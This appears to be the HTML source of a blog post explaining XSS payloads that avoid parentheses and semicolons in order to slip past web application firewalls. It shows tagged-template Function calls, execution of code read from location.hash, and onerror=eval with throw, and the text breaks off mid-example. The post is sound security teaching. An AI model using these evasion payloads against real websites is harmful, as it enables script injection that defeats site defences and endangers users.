@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Explaining XSS without parentheses and semi-colons - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<link href="https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/" rel="alternate" hreflang="en" />
+
+
+<link href="https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/" rel="alternate" hreflang="x-default" />
+
+
+            
+<link href="https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/" rel="alternate" hreflang="zh-TW" />
+            
+
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/">
+    
+
+
+
+
+
+    <meta name="description" content="Recently, I received an email from a reader asking if I could write an article explaining XSS without parentheses and semi-colons, saying that the payloads in it were hard to understand. Therefore, th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Explaining XSS without parentheses and semi-colons">
+<meta property="og:url" content="https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="Recently, I received an email from a reader asking if I could write an article explaining XSS without parentheses and semi-colons, saying that the payloads in it were hard to understand. Therefore, th">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-without-semicolon-and-parentheses/cover-en.png">
+<meta property="article:published_time" content="2025-09-14T20:50:00.000Z">
+<meta property="article:modified_time" content="2025-09-15T05:42:31.235Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/xss-without-semicolon-and-parentheses/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Explaining XSS without parentheses and semi-colons" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#why-do-we-need-such-payloads">1&nbsp;&nbsp;<b>Why do we need such payloads?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#starting-with-no-parentheses">2&nbsp;&nbsp;<b>Starting with no parentheses</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#tagged-template-strings">2.1&nbsp;&nbsp;Tagged template strings</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#onerror-event">2.2&nbsp;&nbsp;onerror Event</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#further-eliminating-semicolons">3&nbsp;&nbsp;<b>Further Eliminating Semicolons</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#other-payloads">4&nbsp;&nbsp;<b>Other payloads</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#summary">5&nbsp;&nbsp;<b>Summary</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2025/09/15/xss-without-semicolon-and-parentheses/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Explaining XSS without parentheses and semi-colons
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2025-09-14T20:50:00.000Z" itemprop="datePublished">15 September 2025</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/JavaScript/">JavaScript</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>Recently, I received an email from a reader asking if I could write an article explaining <a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">XSS without parentheses and semi-colons</a>, saying that the payloads in it were hard to understand.</p>
+<p>Therefore, this article will briefly explain these payloads, referencing Gareth Heyes’ two articles:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://thespanner.co.uk/2012/05/01/xss-technique-without-parentheses">XSS technique without parentheses</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">XSS without parentheses and semi-colons</a></li>
+</ol>
+<span id="more"></span>
+
+<h2><span id="why-do-we-need-such-payloads">Why do we need such payloads?</span></h2><p>Some might wonder, since we can execute JavaScript, why impose so many restrictions? The biggest reason is: WAF (Web Application Firewall). The most common one is Cloudflare’s WAF, which blocks you at the slightest hint of trouble. Even if you can insert HTML or even execute JavaScript, as long as it contains certain patterns, it will be blocked directly.</p>
+<p>Moreover, certain situations may render some characters unusable, and at that point, creativity is needed to find ways to construct executable code without those characters.</p>
+<h2><span id="starting-with-no-parentheses">Starting with no parentheses</span></h2><p>In JavaScript, it seems that to execute a function, parentheses are necessary. So what if we can’t use parentheses?</p>
+<h3><span id="tagged-template-strings">Tagged template strings</span></h3><p>The first method is something some developers may have used but might not think of immediately. Certain JavaScript libraries use template strings to execute functions, such as <a target="_blank" rel="noopener" href="https://github.com/porsager/postgres?tab=readme-ov-file#usage">Postgres.js</a>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getUsersOver</span><span class="token punctuation">(</span><span class="token parameter">age</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> users <span class="token operator">=</span> <span class="token keyword">await</span> sql<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    select
+      name,
+      age
+    from users
+    where age > </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span> age <span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+  </span><span class="token template-punctuation string">`</span></span>
+  <span class="token comment">// users = Result [&#123; name: "Walter", age: 80 &#125;, &#123; name: 'Murray', age: 68 &#125;, ...]</span>
+  <span class="token keyword">return</span> users
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Those unfamiliar might wonder how this is written; isn’t it an SQL injection vulnerability?</p>
+<p>If only template strings were used, then indeed it would be, but note that there is an additional <code>sql</code> at the front, which changes things. It is not just simple string concatenation; it is function execution, which is a JavaScript syntax. You can see the example below:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+test<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Hello </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'huli'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">!!!</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'good'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">~~</span><span class="token template-punctuation string">`</span></span>
+<span class="token comment">// [['Hello ', '!!!', '~~'], 'huli', 'good']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When we add a function at the front, the function’s parameters will receive the fixed parts of the original string and the inserted variables, allowing us to use this information for sanitization to avoid SQL injection. This usage is called tagged template strings.</p>
+<p>The final effect is that it looks like a simple string replacement, but behind it is function execution with sanitization, making it safe.</p>
+<p>Using this concept, we can write an XSS payload that does not require parentheses:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">test</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>However, some might ask, if that’s the case, can we only execute alert? Is there a way to execute arbitrary code? For example, if I want to use fetch to POST, I must use the second parameter: <code>fetch(url, &#123; method:&#39;POST&#39;&#125;)</code>, and the method above would have the second parameter as an array, causing fetch to throw an error and not run.</p>
+<p>To address this issue, we can first use the function constructor to create a function by passing in a string. If you’re not familiar with this, you can read: <a href="https://blog.huli.tw/2020/12/01/en/write-conosle-log-1-without-alphanumeric/">How to write console.log(1) without using letters and numbers?</a> or <a href="https://blog.huli.tw/2021/06/07/en/xss-challenge-by-intigriti-writeup-may/">Intigriti’s 0521 XSS Challenge Solution: Limited Character Combination Code</a>, but I will briefly introduce it here.</p>
+<p>In JavaScript, you can dynamically create a function using <code>new Function(code)</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span>
+<span class="token comment">// anonymous() &#123; alert(1) &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>And that <code>new</code> is actually not necessary; you can remove it without any issue. Furthermore, dynamically created functions can accept parameters:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'alert(a+1)'</span><span class="token punctuation">)</span>
+<span class="token comment">// anonymous(a) &#123; alert(a+1) &#125;</span>
+
+<span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'alert(a+b)'</span><span class="token punctuation">)</span>
+<span class="token comment">// anonymous(a,b) &#123; alert(a+b) &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The last parameter will be treated as the actual code, while the preceding ones will be treated as function parameters, and it will return the created function.</p>
+<p>Therefore, we can use this point in conjunction with the tagged templates mentioned earlier to create a function from a string:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert(1)</span><span class="token template-punctuation string">`</span></span>
+<span class="token comment">// anonymous() &#123; alert(1) &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>So how do we execute this created function? It’s simple; just use the same method again:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Add two backticks at the end, just like the previously mentioned alert`1` usage</span>
+<span class="token comment">// Added an extra space to avoid Markdown parser issues, but it works the same either way</span>
+
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert(1)</span><span class="token template-punctuation string">`</span></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Since <code>alert(1)</code> inside is a string, the parentheses can be directly replaced with unicode, which is also a valid string representation, resulting in:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// it's actually just alert(1)</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert\u00281\u0029</span><span class="token template-punctuation string">`</span></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>This way, the entire payload does not use any parentheses but can still execute arbitrary code!</p>
+<p>This approach utilizes the first parameter when executing the template, which is the fixed part, but we can also use the subsequent parameters. For example:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">// ['_', '']</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">// hello</span>
+<span class="token punctuation">&#125;</span>
+
+test<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'hello'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When we pass both a fixed string and parameters simultaneously, the first parameter is all the fixed parts, as mentioned earlier, while the second parameter is our dynamically passed variable <code>hello</code>.</p>
+<p>Using the method above to create a function, as previously mentioned, the last parameter will be treated as the function body:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'hello'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+<span class="token comment">// anonymous(_,) &#123; hello &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Thus, this <code>hello</code> is the part we can control. Since it is dynamically passed, there are many ways to play with it, which can be combined with places we can control on the website. For example, <code>location.hash</code> returns the hash from the URL like <code>#test</code>, and by adding <code>slice(1)</code>, we can remove the preceding <code>#</code>, combined it becomes:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// start from this</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'hello'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+<span class="token comment">// then using location.hash.slice(1)</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+<span class="token comment">// replace slice(1) with ``</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span>slice<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+<span class="token comment">// add `` to run the function</span>
+<span class="token comment">// remember to set the hash to #alert(1)</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span>slice<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This constructs a payload that does not require parentheses but can execute arbitrary code, placing the actual string to be executed in the hash and dynamically executing the code in the hash.</p>
+<h3><span id="onerror-event">onerror Event</span></h3><p>All the previous writing has not yet gotten to the main point; the original discovery mentioned at the beginning is another more clever method.</p>
+<p>In a browser environment, by using <code>window.onerror</code>, we can receive all uncaught error events:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Err:'</span> <span class="token operator">+</span> err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">throw</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+<span class="token comment">// Err:Uncaught hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>By the way, the above code will not work if executed directly in DevTools (the reason is mentioned in the original post; errors will not be thrown to <code>onerror</code> when executed directly in the console), so please open an HTML to test.</p>
+<p>In short, the above code tells us that in Chrome, the captured error message will be <code>Uncaught hello</code>.</p>
+<p>So what if we directly replace <code>onerror</code> with <code>alert</code>?</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> alert<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>You will directly see a popup saying <code>Uncaught hello</code>. The above payload does not use any parentheses and achieves the purpose of executing a function.</p>
+<p>Further extending this, we can replace <code>onerror</code> with <code>eval</code>, treating the error message as JavaScript code to execute, but the problem is how to construct valid code after replacing it with <code>eval</code>?</p>
+<p>Since the captured error message will be: <code>Uncaught &#123;payload&#125;</code>, this entire sentence will be treated as code to execute, so as long as we replace the payload with: <code>=alert(1)</code>, the whole sentence becomes: <code>Uncaught=alert(1)</code>, using <code>Uncaught</code> in the error message as a variable, thus forming valid code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'=alert(1)'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>If you still don’t understand the principle, replacing <code>eval</code> with <code>console.log</code> makes it very clear:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'=alert(1)'</span><span class="token punctuation">;</span>
+<span class="token comment">// Uncaught =alert(1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Next, since the string follows <code>throw</code>, we can also use encoding to replace it, using <code>\x28</code> or <code>\u0028</code> will work:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'=alert\x281\u0029'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>This constructs a payload that does not require parentheses.</p>
+<h2><span id="further-eliminating-semicolons">Further Eliminating Semicolons</span></h2><p>Tagged template strings no longer require semicolons, so let’s continue along the path of <code>onerror</code> to see how to eliminate semicolons.</p>
+<p>A simple and intuitive idea is to just use a comma (for convenience, I’ll use alert below):</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>alert<span class="token punctuation">,</span><span class="token keyword">throw</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>But after running it, you’ll find an error: <code>Uncaught SyntaxError: Unexpected token &#39;throw&#39;</code>. This is because <code>throw</code> is not an expression but a statement, so it cannot be placed after a comma; we need another method.</p>
+<p>In JavaScript, even if you don’t use <code>if</code> or other code that requires a block, you can create your own block to wrap the code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This is indeed used in development (though not often), and its purpose is to deliberately create a block and use the <code>let</code> or <code>const</code> keywords, allowing variables to only exist within that block.</p>
+<p>By utilizing a block, you can achieve the goal of separating code without needing semicolons:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">&#125;</span><span class="token keyword">throw</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>In addition to using blocks, there are other cooler methods.</p>
+<p>First, let’s talk about the use of commas in JavaScript. Basically, it concatenates several expressions and returns the result of the last one, such as:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 1</span>
+<span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The expressions in <code>if</code> will sequentially execute <code>console.log(1)</code>, <code>alert(1)</code>, and finally return true, so the result of the <code>if</code> is valid, printing true.</p>
+<p>And <code>throw</code> can be followed by an expression, so you can:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">throw</span> onerror<span class="token operator">=</span>alert<span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>This will first execute <code>onerror=alert</code>, then execute <code>throw 1</code>, achieving the same effect as our method using <code>&#123;&#125;</code>. This is another way that doesn’t require semicolons.</p>
+<p>The Chrome part ends here; the following is all efforts made for Firefox.</p>
+<p>In Firefox, when there is an error, the format of the error message is different:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token comment">// uncaught exception: 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Under this error message, it’s impossible to construct valid code, and the previous suggestion of replacing <code>onerror</code> with <code>eval</code> no longer works.</p>
+<p>So Gareth Heyes continued to dig deeper and discovered two things. The first is that if you throw an Error instead of a string, the error message won’t have those annoying prefixes, leaving just <code>Error:</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Error: 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Since <code>Label:</code> is valid code in JavaScript, you can directly place code after it, making it easy:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>However, using <code>Error()</code> introduces parentheses, and Gareth Heyes’ second discovery is that in Firefox, you can throw an error-like object to achieve the same effect:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>eval<span class="token punctuation">;</span>
